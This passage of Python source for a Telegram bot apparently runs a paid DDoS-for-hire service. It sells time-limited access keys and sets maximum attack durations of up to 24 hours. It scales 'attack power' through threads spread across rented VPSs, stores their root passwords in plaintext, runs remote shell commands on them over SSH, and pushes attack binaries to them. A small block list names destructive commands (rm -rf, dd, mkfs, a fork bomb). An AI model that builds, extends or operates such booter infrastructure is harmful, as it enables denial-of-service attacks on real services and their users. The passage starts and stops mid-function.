            "🧹 *System Cleanup Complete*\n\n"
            f"🗑️ Removed {temp_files} temporary files\n"
            f"📝 Cleared {log_files} log files\n\n"
            "🔄 System should perform better now"
        )
        
        bot.send_message(
            chat_id,
            response,
            parse_mode='Markdown'
        )
    except Exception as e:
        bot.send_message(
            chat_id,
            f"❌ Failed to cleanup system: {str(e)}",
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "➕ Add Admin" and is_super_admin(message.from_user.id))
def add_admin_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to add admins.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the User ID to add as admin:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_admin_addition)

def process_admin_addition(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    new_admin = message.text.strip()
    
    try:
        new_admin_id = int(new_admin)
    except ValueError:
        bot.send_message(chat_id, "*Invalid User ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    admin_data = load_admin_data()
    
    if str(new_admin_id) in admin_data['admins']:
        bot.send_message(
            chat_id,
            f"*User {new_admin_id} is already an admin!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    admin_data['admins'][str(new_admin_id)] = {
        'added_by': user_id,
        'added_at': datetime.now().isoformat(),
        'balance': 0
    }
    
    if save_admin_data(admin_data):
        bot.send_message(
            chat_id,
            f"*User {new_admin_id} added as admin successfully!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to add admin {new_admin_id}.*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "➖ Remove Admin" and is_super_admin(message.from_user.id))
def remove_admin_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to remove admins.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the Admin ID to remove:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_admin_removal)

def process_admin_removal(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    admin_to_remove = message.text.strip()
    
    try:
        admin_id = int(admin_to_remove)
    except ValueError:
        bot.send_message(chat_id, "*Invalid Admin ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    if admin_id in ADMIN_IDS:
        bot.send_message(
            chat_id,
            "*Cannot remove super admin!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    admin_data = load_admin_data()
    
    if str(admin_id) not in admin_data['admins']:
        bot.send_message(
            chat_id,
            f"*User {admin_id} is not an admin!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    del admin_data['admins'][str(admin_id)]
    
    if save_admin_data(admin_data):
        bot.send_message(
            chat_id,
            f"*Admin {admin_id} removed successfully!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to remove admin {admin_id}.*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📜 Rules")
def show_rules(message):
    rules_text = """
╔════════════════════════╗
║        📜 RULES        ║
╚════════════════════════╝

🔹 *1. No Spamming*  
   - Excessive commands or messages will result in a ban

🔹 *2. Authorized Attacks Only*  
   - Only target approved IPs in designated groups

🔹 *3. Follow Instructions*  
   - Read all attack guidelines carefully before proceeding

🔹 *4. Respect Everyone*  
   - Admins, users, and staff must be treated with respect

🔹 *5. Provide Feedback*  
   - Report issues after each attack to help us improve

🔹 *6. Zero Tolerance*  
   - Violations = Immediate ban  
   - Severe abuse = Permanent blacklist

✨ *By using this bot, you agree to these rules* ✨

🚀 *Stay professional, stay powerful!* 🚀
"""
    bot.send_message(message.chat.id, rules_text, parse_mode="Markdown")


@bot.message_handler(func=lambda message: message.text == "📋 List Users" and is_super_admin(message.from_user.id))
def list_users_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to list users.*", parse_mode='Markdown')
        return
    
    users = load_users()
    admin_data = load_admin_data()
    
    if not users:
        bot.send_message(chat_id, "*No users found!*", parse_mode='Markdown')
        return
    
    response = "*Registered Users:*\n\n"
    for user in users:
        valid_until = datetime.fromisoformat(user['valid_until'])
        remaining = valid_until - datetime.now()
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        
        response += (
            f"User ID: `{user['user_id']}`\n"
            f"Key: `{user['key']}`\n"
            f"Expires in: `{hours}h {minutes}m`\n"
            f"Valid until: `{valid_until.strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
        )
    
    bot.send_message(
        chat_id,
        response,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "👥 List Users" and is_admin(message.from_user.id))
def list_users_menu(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    bot.send_message(
        chat_id,
        "📋 *User List Management* 📋\n\n"
        "Select which list you want to view:",
        reply_markup=get_user_list_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "👥 All Users" and is_admin(message.from_user.id))
def list_all_users(message):
    chat_id = message.chat.id
    users = load_users()
    admin_data = load_admin_data()
    owner_data = load_owner_data()

    all_users = []

    # Regular Users
    for user in users:
        all_users.append({
            'id': user['user_id'],
            'type': 'User',
            'key': user.get('key', 'N/A'),
            'expiry': user.get('valid_until', 'N/A'),
            'vip': user.get('is_vip', False)
        })

    # Admins
    for admin_id in admin_data.get('admins', {}):
        all_users.append({
            'id': int(admin_id),
            'type': 'Admin',
            'key': 'ADMIN',
            'expiry': 'Permanent',
            'vip': True
        })

    # Owners
    for owner_id in owner_data.get('owners', []):
        all_users.append({
            'id': owner_id,
            'type': 'Owner',
            'key': 'OWNER',
            'expiry': 'Permanent',
            'vip': True
        })

    if not all_users:
        bot.send_message(
            chat_id,
            "❌ No users found!",
            parse_mode='Markdown',
            reply_markup=get_user_list_markup()
        )
        return

    response = "📋 *User List Overview*\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━\n\n"

    for i, user in enumerate(all_users, 1):
        try:
            chat_member = bot.get_chat_member(chat_id, user['id'])
            username = f"@{chat_member.user.username}" if chat_member.user.username else "No username"
        except Exception:
            username = "Unknown"

        expiry = user.get('expiry')
        remaining = None

        if isinstance(expiry, str) and expiry.strip() not in ['N/A', 'Permanent', '']:
            try:
                expires = datetime.fromisoformat(expiry.strip())
                remaining = expires - datetime.now()
            except ValueError:
                remaining = None

        # Format user block
        response += f"🧾 *User {i}*\n"
        response += f"🆔 ID: `{user['id']}`\n"
        response += f"👤 Username: `{username}`\n"
        response += f"📛 Role: *{user['type']}*\n"

        if user['type'] == 'User':
            response += f"🔑 Key: `{user['key']}`\n"
            if remaining and remaining.total_seconds() > 0:
                days = remaining.days
                hours = remaining.seconds // 3600
                response += f"⏳ Valid for: *{days}d {hours}h*\n"
            else:
                response += f"⏳ Valid for: ❌ *Expired*\n"
            response += f"💎 VIP: {'✅' if user['vip'] else '❌'}\n"
        else:
            response += f"💎 VIP: ✅\n"

        response += "━━━━━━━━━━━━━━━━━━━━━━━\n"

    bot.send_message(
        chat_id,
        response,
        parse_mode='Markdown',
        reply_markup=get_user_list_markup()
    )

@bot.message_handler(func=lambda message: message.text == "🔑 Key Users" and is_admin(message.from_user.id))
def list_key_users(message):
    chat_id = message.chat.id
    users = load_users()

    # Filter users with active valid_until keys
    active_users = []
    for user in users:
        expiry_str = user.get('valid_until', '')
        if expiry_str:
            try:
                expiry_date = datetime.fromisoformat(expiry_str)
                if datetime.now() < expiry_date:
                    active_users.append(user)
            except ValueError:
                continue  # Skip users with invalid date format

    if not active_users:
        response = "❌ *No active key users found.*"
    else:
        response = "*🔑 ACTIVE KEY USERS*\n"
        response += "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        for i, user in enumerate(active_users, 1):
            username = f"`{user['user_id']}`"
            key = user.get('key', 'N/A')
            expiry = user.get('valid_until', 'N/A')
            vip = '✅' if user.get('is_vip', False) else '❌'

            response += f"👤 *User {i}*\n"
            response += f"🆔 ID: `{user['user_id']}`\n"
            response += f"🔑 Key: `{key}`\n"
            response += f"⏳ Expires: `{expiry}`\n"
            response += f"💎 VIP: {vip}\n"
            response += "━━━━━━━━━━━━━━━━━━━━━━━\n"

    bot.send_message(
        chat_id,
        response,
        parse_mode='Markdown',
        reply_markup=get_user_list_markup()
    )

@bot.message_handler(func=lambda message: message.text == "👑 Admins" and is_admin(message.from_user.id))
def list_admins(message):
    chat_id = message.chat.id
    admin_data = load_admin_data()
    admins = list(admin_data['admins'].keys())
    
    response = format_user_list(admins, "ADMINS")
    bot.send_message(
        chat_id,
        response,
        parse_mode='Markdown',
        reply_markup=get_user_list_markup()
    )

@bot.message_handler(func=lambda message: message.text == "👨‍💻 Owners" and is_owner(message.from_user.id))
def list_owners(message):
    chat_id = message.chat.id
    owner_data = load_owner_data()
    
    response = format_user_list(owner_data['owners'], "OWNERS")
    bot.send_message(
        chat_id,
        response,
        parse_mode='Markdown',
        reply_markup=get_user_list_markup()
    )

@bot.message_handler(func=lambda message: message.text == "✅ Approve User" and is_admin(message.from_user.id))
def approve_user_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    bot.send_message(
        chat_id,
        "✨ *User Approval System* ✨\n\n"
        "Send the User ID to approve:\n\n"
        "💡 Format: `123456789`\n"
        "❌ Type '0' to cancel",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_user_approval)

def process_user_approval(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    input_text = message.text.strip()
    
    if input_text == '0':
        bot.send_message(
            chat_id,
            "🚫 *Approval cancelled!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    try:
        target_user_id = int(input_text)
    except ValueError:
        bot.send_message(
            chat_id,
            "❌ *Invalid User ID!*\n\n"
            "Please enter a numeric ID only",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    # Check if user already exists
    users = load_users()
    if any(u['user_id'] == target_user_id for u in users):
        bot.send_message(
            chat_id,
            f"ℹ️ *User {target_user_id} already approved!*\n\n"
            "No changes were made",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    # Add user with 30-day access and mark as manually approved
    expires = datetime.now() + timedelta(days=30)
    users.append({
        'user_id': target_user_id,
        'key': "MANUAL-APPROVAL",  # Special marker for manually approved users
        'valid_until': expires.isoformat(),
        'approved_by': user_id,
        'approved_at': datetime.now().isoformat(),
        'is_vip': False  # Default to non-VIP
    })
    
    if save_users(users):
        bot.send_message(
            chat_id,
            f"✅ *User Approved Successfully!*\n\n"
            f"👤 User ID: `{target_user_id}`\n"
            f"⏳ Expires: {expires.strftime('%d %b %Y')}\n"
            f"👑 Approved by: `{user_id}`\n\n"
            f"🌟 *User can now use all features including claim!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            "❌ *Failed to approve user!*\n\n"
            "Database error occurred",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
        
@bot.message_handler(func=lambda message: message.text == "⚙️ Max Time" and is_admin(message.from_user.id))
def max_time_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    current_max = 300 if is_admin(user_id) else 60
    
    bot.send_message(
        chat_id,
        f"⏱️ *Current Max Attack Time: {current_max}s*\n\n"
        "Enter new max attack time (in seconds):\n\n"
        "💡 Recommended: 60-600\n"
        "❌ Type '0' to cancel",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_max_time)

def process_max_time(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    input_text = message.text.strip()
    
    if input_text == '0':
        bot.send_message(
            chat_id,
            "🚫 *Max time unchanged!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    try:
        new_max = int(input_text)
        if new_max < 10 or new_max > 86400:  # Max 24 hours
            raise ValueError
        
        global ADMIN_MAX_TIME
        ADMIN_MAX_TIME = new_max
        
        bot.send_message(
            chat_id,
            f"✅ *Max attack time updated to {ADMIN_MAX_TIME} seconds!*\n\n"
            f"Admins can now launch attacks up to {ADMIN_MAX_TIME} seconds.",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
    except ValueError:
        bot.send_message(
            chat_id,
            "❌ *Invalid time!*\n\n"
            "Please enter a number between 10-86400 (24 hours max)",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "⚙️ Set Threads" and is_super_admin(message.from_user.id))
def set_threads_command(message):
    chat_id = message.chat.id
    bot.send_message(
        chat_id,
        "🧵 *Set Threads Per VPS*\n\n"
        "Current value: `{THREADS_PER_VPS}`\n"
        "Enter new value (100-10000):\n\n"
        "💡 Recommended: 200-2000\n"
        "❌ Type 'cancel' to abort",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_thread_setting)

def process_thread_setting(message):
    chat_id = message.chat.id
    user_input = message.text.strip()
    
    if user_input.lower() == 'cancel':
        bot.send_message(
            chat_id,
            "🚫 Thread update cancelled",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    try:
        new_threads = int(user_input)
        if not (100 <= new_threads <= 10000):
            raise ValueError("Out of range")
            
        if save_config(new_threads):
            global THREADS_PER_VPS
            THREADS_PER_VPS = new_threads
            bot.send_message(
                chat_id,
                f"✅ *Threads Per VPS Updated!*\n\n"
                f"New value: `{THREADS_PER_VPS}`\n"
                f"All new attacks will use this setting.",
                reply_markup=get_super_admin_markup(),
                parse_mode='Markdown'
            )
        else:
            bot.send_message(
                chat_id,
                "❌ Failed to save thread configuration!",
                reply_markup=get_super_admin_markup(),
                parse_mode='Markdown'
            )
    except ValueError:
        bot.send_message(
            chat_id,
            "❌ Invalid input! Please enter a number between 100-10000",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "🧵 Show Threads" and is_admin(message.from_user.id))
def show_threads(message):
    active_vps = get_active_vps_list()
    total_power = THREADS_PER_VPS * len(active_vps)
    
    bot.send_message(
        message.chat.id,
        f"📊 *Current Thread Configuration*\n\n"
        f"🧵 Threads per VPS: `{THREADS_PER_VPS}`\n"
        f"🖥️ Active VPS Count: `{len(active_vps)}`\n"
        f"🚀 Total Attack Power: `{total_power} threads`\n\n"
        f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        f"To change: Use *Set Threads* command",
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🖥️ VPS Management" and is_owner(message.from_user.id))
def vps_management(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(
            chat_id,
            "🔒 *Permission Denied*\nOnly owners can manage VPS",
            parse_mode='Markdown'
        )
        return
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("➕ Add VPS"),
        KeyboardButton("🗑️ Remove VPS"),
        KeyboardButton("📋 List VPS"),
        KeyboardButton("🔄 Check Status"),
        KeyboardButton("⚙️ Binary Tools"),
        KeyboardButton("💻 Terminal"),
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    
    bot.send_message(
        chat_id,
        "🖥️ *VPS Management Panel* 🖥️\n\n"
        "Select an option below:",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "➕ Add VPS" and is_owner(message.from_user.id))
def add_vps_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "🔒 *You don't have permission to add VPS!*", parse_mode='Markdown')
        return
    
    # Stylish formatted message with emojis
    response = (
        "✨ *VPS Addition Panel* ✨\n"
        "╔════════════════════════════╗\n"
        "║  🆕 *ADD NEW VPS SERVER*    ║\n"
        "╚════════════════════════════╝\n\n"
        "📝 *Please send VPS details in format:*\n"
        "```\n"
        "IP USERNAME PASSWORD\n"
        "```\n\n"
        "🔹 *Example:*\n"
        "```\n"
        "1.1.1.1 root password123\n"
        "```\n\n"
        "💡 *Requirements:*\n"
        "• Single space between each value\n"
        "• No extra spaces before/after\n\n"
        "❌ *Type '0' to cancel*"
    )
    
    bot.send_message(
        chat_id,
        response,
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_vps_addition)

def process_vps_addition(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    input_text = message.text.strip()
    
    # Cancel option
    if input_text == '0':
        bot.send_message(
            chat_id,
            "🚫 *VPS addition cancelled!*",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
        return
    
    vps_details = input_text.split()
    
    if len(vps_details) != 3:
        bot.send_message(
            chat_id,
            "❌ *Invalid Format!*\n\n"
            "┌──────────────────────────────┐\n"
            "│  🔄 *CORRECT FORMAT*         │\n"
            "├──────────────────────────────┤\n"
            "│ `IP USERNAME PASSWORD`       │\n"
            "└──────────────────────────────┘\n\n"
            "Example:\n"
            "`1.1.1.1 root password123`",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
        return
    
    ip, username, password = vps_details
    vps_data = load_vps_data()
    
    if ip in vps_data['vps']:
        bot.send_message(
            chat_id,
            f"⚠️ *VPS Already Exists!*\n\n"
            f"┌──────────────────────────────┐\n"
            f"│  🖥️ *DUPLICATE SERVER*       │\n"
            f"├──────────────────────────────┤\n"
            f"│ 🌐 IP: `{ip}`               │\n"
            f"│ 👤 User: `{username}`       │\n"
            f"└──────────────────────────────┘",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
        return
    
    vps_data['vps'][ip] = {
        'username': username,
        'password': password,
        'added_by': user_id,
        'added_at': datetime.now().isoformat()
    }
    
    if save_vps_data(vps_data):
        bot.send_message(
            chat_id,
            f"✅ *VPS Added Successfully!*\n\n"
            f"┌──────────────────────────────┐\n"
            f"│  🖥️ *SERVER DETAILS*         │\n"
            f"├──────────────────────────────┤\n"
            f"│ 🌐 IP: `{ip}`               │\n"
            f"│ 👤 User: `{username}`       │\n"
            f"│ 🔑 Pass: `{password[:2]}•••••`  │\n"
            f"│ 📅 Added: `{datetime.now().strftime('%d %b %Y %H:%M')}` │\n"
            f"└──────────────────────────────┘",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            "❌ *Failed to Add VPS!*\n\n"
            "Database error occurred. Please try again.",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📋 List Binaries" and is_owner(message.from_user.id))
def list_binaries_command(message):
    chat_id = message.chat.id
    vps_data = load_vps_data()
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [KeyboardButton(f"🖥️ {ip}") for ip in vps_data['vps']]
    buttons.append(KeyboardButton("⬅️ Back"))
    markup.add(*buttons)
    
    bot.send_message(
        chat_id,
        "🖥️ *Select VPS to list binaries from:*",
        reply_markup=markup,
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_binary_list_selection)

def process_binary_list_selection(message):
    chat_id = message.chat.id
    
    if message.text == "⬅️ Back":
        bot.send_message(
            chat_id,
            "↩️ Returning to binary management...",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )
        return
    
    ip = message.text.replace("🖥️ ", "").strip()
    vps_data = load_vps_data()
    
    if ip not in vps_data['vps']:
        bot.send_message(
            chat_id,
            f"❌ VPS {ip} not found!",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )
        return
    
    details = vps_data['vps'][ip]
    success, output = ssh_execute(
        ip,
        details['username'],
        details['password'],
        "ls -la /root/bin"
    )
    
    if not success:
        bot.send_message(
            chat_id,
            f"❌ Failed to list binaries on {ip}!\nError: {output}",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )
        return
    
    if not output.strip():
        response = f"ℹ️ No binaries found in /root/bin on {ip}"
    else:
        response = f"📋 *Binaries on {ip}*:\n```\n{output}\n```"
    
    bot.send_message(
        chat_id,
        response,
        reply_markup=get_vps_binary_markup(),
        parse_mode='Markdown'
    )


@bot.message_handler(func=lambda m: m.text == "💻 Run Command" and is_owner(m.from_user.id))
def handle_custom_command_prompt(message):
    """Prompt for custom command"""
    chat_id = message.chat.id
    vps_data = load_vps_data()
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [KeyboardButton(f"🖥️ {ip}") for ip in vps_data['vps']]
    buttons.append(KeyboardButton("⬅️ Cancel"))
    markup.add(*buttons)
    
    bot.send_message(
        chat_id,
        "🖥️ *Select VPS for command execution:*\n\n"
        "After selection, you'll be prompted to enter your command.",
        reply_markup=markup,
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_command_vps_selection)

def process_command_vps_selection(message):
    """Handle VPS selection for command"""
    chat_id = message.chat.id
    
    if message.text == "⬅️ Cancel":
        bot.send_message(
            chat_id,
            "🚫 Command execution cancelled.",
            reply_markup=get_vps_terminal_markup(),
            parse_mode='Markdown'
        )
        return
    
    ip = message.text.replace("🖥️ ", "").strip()
    vps_data = load_vps_data()
    
    if ip not in vps_data['vps']:
        bot.send_message(
            chat_id,
            f"❌ VPS {ip} not found!",
            reply_markup=get_vps_terminal_markup(),
            parse_mode='Markdown'
        )
        return
    
    bot.send_message(
        chat_id,
        f"💻 *Ready for command on {ip}*\n\n"
        "Enter your Linux command (e.g., `ls -la`, `uptime`):\n\n"
        "⚠️ *Dangerous commands are automatically blocked*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_terminal_command, ip)

def process_terminal_command(message, ip):
    """Execute the command on VPS"""
    chat_id = message.chat.id
    command = message.text.strip()
    
    # Block dangerous commands
    BLOCKED_COMMANDS = ['rm -rf', 'dd', 'mkfs', 'fdisk', ':(){:|:&};:']
    if any(cmd in command for cmd in BLOCKED_COMMANDS):
        bot.send_message(
            chat_id,
            "❌ *Dangerous command blocked!*",
            reply_markup=get_vps_terminal_markup(),
            parse_mode='Markdown'
        )
        return
    
    try:
        vps_data = load_vps_data()
        details = vps_data['vps'][ip]
        
        # Execute command with timeout
        success, output = ssh_execute(
            ip,
            details['username'],
            details['password'],
            command
        )
        
        if not success:
            raise Exception(output)
        
        # Format output and escape Markdown special characters
        if len(output) > 3000:
            output = output[:3000] + "\n[...truncated...]"
        
        # Escape Markdown special characters
        escaped_command = escape(command)
        escaped_output = escape(output)
        
        response = (
            f"🖥️ *Command Output* (`{ip}`)\n\n"
            f"```\n$ {escaped_command}\n```\n"
            f"```\n{escaped_output}\n```"
        )
        
        bot.send_message(
            chat_id,
            response,
            reply_markup=get_vps_terminal_markup(),
            parse_mode='Markdown'
        )
        
    except Exception as e:
        bot.send_message(
            chat_id,
            f"❌ Command failed!\nError: {str(e)}",
            reply_markup=get_vps_terminal_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda m: m.text in ["📁 List Directory", "🔄 Check Services", "📊 Check Resources", "🛑 Kill Process"] and is_owner(m.from_user.id))
def handle_quick_commands(message):
    """Handle predefined command buttons"""
    command_map = {
        "📁 List Directory": "ls -la",
        "🔄 Check Services": "systemctl list-units --type=service",
        "📊 Check Resources": "top -bn1 | head -10",
        "🛑 Kill Process": "ps aux"
    }
    
    # Store the command for VPS selection
    message.text = command_map[message.text]
    handle_custom_command_prompt(message)

@bot.message_handler(func=lambda m: m.text == "⚙️ Binary Tools" and is_owner(m.from_user.id))
def handle_binary_tools(message):
    """Entry point for binary management"""
    bot.send_message(
        message.chat.id,
        "🛠️ *Binary File Management*",
        reply_markup=get_vps_binary_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda m: m.text == "⬆️ Upload Binary" and is_owner(m.from_user.id))
def handle_upload_binary_prompt(message):
    """Prompt user to select VPS for upload"""
    chat_id = message.chat.id
    vps_data = load_vps_data()
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [KeyboardButton(f"🖥️ {ip}") for ip in vps_data['vps']]
    buttons.append(KeyboardButton("⬅️ Cancel"))
    markup.add(*buttons)
    
    bot.send_message(
        chat_id,
        "🖥️ *Select target VPS for binary upload:*",
        reply_markup=markup,
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_binary_upload_selection)

def process_binary_upload_selection(message):
    """Handle VPS selection for upload"""
    chat_id = message.chat.id
    
    if message.text == "⬅️ Cancel":
        bot.send_message(
            chat_id,
            "🚫 Binary upload cancelled.",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )
        return
    
    ip = message.text.replace("🖥️ ", "").strip()
    vps_data = load_vps_data()
    
    if ip not in vps_data['vps']:
        bot.send_message(
            chat_id,
            f"❌ VPS {ip} not found!",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )
        return
    
    bot.send_message(
        chat_id,
        f"📤 Ready to upload binary to {ip}\n\n"
        "Please send the binary file now (e.g., .sh, .bin, executable):",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_binary_upload, ip)

@bot.message_handler(content_types=['document'], func=lambda m: is_owner(m.from_user.id))
def process_binary_upload(message, ip):
    """Handle actual file upload to VPS"""
    chat_id = message.chat.id
    file = message.document
    
    try:
        # Verify it's a binary file
        if not file.file_name.startswith('smokey'):
            raise ValueError("Only smokey binary files allowed")
        
        # Download file
        file_info = bot.get_file(file.file_id)
        file_bytes = bot.download_file(file_info.file_path)
        
        # Upload to VPS
        vps_data = load_vps_data()
        details = vps_data['vps'][ip]
        
        transport = paramiko.Transport((ip, 22))
        transport.connect(username=details['username'], password=details['password'])
        
        sftp = paramiko.SFTPClient.from_transport(transport)
        remote_path = f"/home/master/raja"  # Directly to root as smokey
        
        with sftp.file(remote_path, 'wb') as remote_file:
            remote_file.write(file_bytes)
        
        # Make executable
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=details['username'], password=details['password'])
        ssh.exec_command(f"chmod +x {remote_path}")
        ssh.close()
        
        sftp.close()
        transport.close()
        
        bot.send_message(
            chat_id,
            f"✅ *Binary Upload Successful!*\n\n"
            f"🖥️ VPS: `{ip}`\n"
            f"📁 Path: `{remote_path}`\n"
            f"🔒 Permissions: `755`\n"
            f"💾 Size: {len(file_bytes)/1024:.2f} KB",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )
        
    except Exception as e:
        bot.send_message(
            chat_id,
            f"❌ Binary upload failed!\nError: {str(e)}",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda m: m.text == "🗑️ Remove Binary" and is_owner(m.from_user.id))
def handle_remove_binary_prompt(message):
    """Prompt for binary removal"""
    chat_id = message.chat.id
    vps_data = load_vps_data()
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [KeyboardButton(f"🖥️ {ip}") for ip in vps_data['vps']]
    buttons.append(KeyboardButton("⬅️ Cancel"))
    markup.add(*buttons)
    
    bot.send_message(
        chat_id,
        "🖥️ *Select VPS to remove binary from:*",
        reply_markup=markup,
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_binary_removal_selection)

def process_binary_removal_selection(message):
    """Handle VPS selection for removal"""
    chat_id = message.chat.id
    
    if message.text == "⬅️ Cancel":
        bot.send_message(
            chat_id,
            "🚫 Binary removal cancelled.",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )
        return
    
    ip = message.text.replace("🖥️ ", "").strip()
    vps_data = load_vps_data()
    
    if ip not in vps_data['vps']:
        bot.send_message(
            chat_id,
            f"❌ VPS {ip} not found!",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )
        return
    
    # Get list of binaries
    details = vps_data['vps'][ip]
    success, output = ssh_execute(
        ip,
        details['username'],
        details['password'],
        "ls /root/bin"
    )
    
    if not success or not output.strip():
        bot.send_message(
            chat_id,
            f"❌ No binaries found on {ip} in /root/bin",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )
        return
    
    binaries = output.split()
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [KeyboardButton(f"📦 {binary}") for binary in binaries]
    buttons.append(KeyboardButton("⬅️ Back"))
    markup.add(*buttons)
    
    bot.send_message(
        chat_id,
        f"📋 *Binaries on {ip}:*\n\n" +
        "\n".join(f"• `{binary}`" for binary in binaries) +
        "\n\nSelect binary to remove:",
        reply_markup=markup,
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_binary_removal, ip)

def process_binary_removal(message, ip):
    """Execute binary removal on VPS"""
    chat_id = message.chat.id
    
    if message.text == "⬅️ Back":
        bot.send_message(
            chat_id,
            "↩️ Returning to binary management...",
            reply_markup=get_vps_binary_markup(),
            parse_mode='Markdown'
        )
        return
    
    binary = message.text.replace("📦 ", "").strip()
    vps_data = load_vps_data()
    details = vps_data['vps'][ip]
    
    try:
        # Remove binary
